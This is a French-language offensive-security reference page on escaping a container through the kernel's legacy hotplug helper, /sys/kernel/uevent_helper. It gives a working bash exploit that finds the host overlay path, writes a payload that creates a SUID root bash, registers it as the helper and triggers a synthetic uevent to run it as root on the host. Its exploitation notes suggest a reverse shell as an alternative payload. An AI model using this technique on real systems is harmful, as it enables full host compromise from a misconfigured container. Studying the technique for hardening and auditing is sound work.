---
title: "uevent_helper : exécuter un programme sur un événement de périphérique synthétique"
order: 2
description: "Le mécanisme de hotplug hérité exécute le programme indiqué dans /sys/kernel/uevent_helper, en tant que root dans les espaces de noms de l'hôte, pour chaque uevent de périphérique. Un conteneur dont le sysfs est monté en écriture définit uevent_helper sur une charge utile puis écrit add dans le fichier uevent d'un périphérique pour déclencher l'événement immédiatement, exécutant la charge utile sur l'hôte."
keywords:
  - uevent_helper
  - hotplug
  - sysfs
  - uevent de périphérique
  - évasion de conteneur
---

# uevent_helper

Avant udev basé sur netlink, le noyau gérait le hotplug de périphériques en exécutant un assistant en espace utilisateur pour chaque uevent. Ce chemin d'assistant existe toujours à `/sys/kernel/uevent_helper`, et lorsqu'il est défini, le noyau l'exécute en tant que root dans les espaces de noms initiaux de l'hôte à chaque événement de périphérique. Un conteneur dont le sysfs de l'hôte est monté en écriture définit ce chemin sur une charge utile puis déclenche un uevent à la demande en écrivant dans le fichier `uevent` de n'importe quel périphérique, offrant une exécution fiable sur l'hôte sans attendre un véritable événement matériel.

Confirmez la possibilité d'écriture :

```bash
ls -l /sys/kernel/uevent_helper
[ -w /sys/kernel/uevent_helper ] && echo writable
```

## La technique

```bash
# 1. Host-resolvable payload
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
cat > /payload <<SH
#!/bin/sh
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
id > $host/out 2>&1
SH
chmod +x /payload

# 2. Set the hotplug helper to the payload
echo "$host/payload" > /sys/kernel/uevent_helper

# 3. Fire a synthetic uevent on any device node in sysfs
echo add > /sys/class/mem/null/uevent
sleep 1; cat /out; ls -l /tmp/rootbash
```

Écrire `add` dans un fichier `uevent` force le noyau à émettre l'événement et à invoquer l'assistant immédiatement, de sorte qu'aucun changement de périphérique physique n'est nécessaire.

## Notes d'exploitation

- N'importe quel fichier `uevent` accessible en écriture sous `/sys` fonctionne comme déclencheur ; `/sys/class/mem/null/uevent` et `/sys/devices/.../uevent` sont des choix courants.
- Cela nécessite que le sysfs de l'hôte soit monté en écriture dans le conteneur, généralement sous `--privileged` ou avec un `-v /sys:...` explicite sans `ro` ; un sysfs en lecture seule le met en échec.
- La charge utile s'exécute une fois par événement ; utilisez-la pour déposer un bash SUID ou un reverse shell plutôt que pour maintenir une session.

## Références

- [Documentation du noyau : uevent et hotplug](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [HackTricks : uevent_helper escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/sensitive-mounts#sys-kernel-uevent_helper)
- [BishopFox : sensitive sysfs mounts](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
